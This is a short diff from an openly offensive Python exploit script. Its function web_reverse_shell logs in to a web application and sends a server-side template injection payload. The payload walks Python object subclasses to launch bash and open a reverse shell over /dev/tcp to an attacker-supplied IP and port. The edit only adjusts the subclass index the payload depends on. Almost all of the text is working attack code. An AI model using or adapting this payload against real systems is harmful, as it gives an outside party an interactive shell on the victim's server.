@@ -97,7 +97,7 @@ def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
 
     web_login(session, uid, pwd, f'/profile/{uid}')
 
-    part_1 = f"{{{{''.__class__.mro()[1].__subclasses__()[650](['/bin/bash','-c',"
+    part_1 = f"{{{{''.__class__.mro()[1].__subclasses__()[655](['/bin/bash','-c',"
     part_2 = f"'/bin/bash -i >& /dev/tcp/{remote_attacker_ip}/{remote_attacker_port} 0>&1'])}}}}"
 
     answer = web_render(session, uid, part_1, part_2)
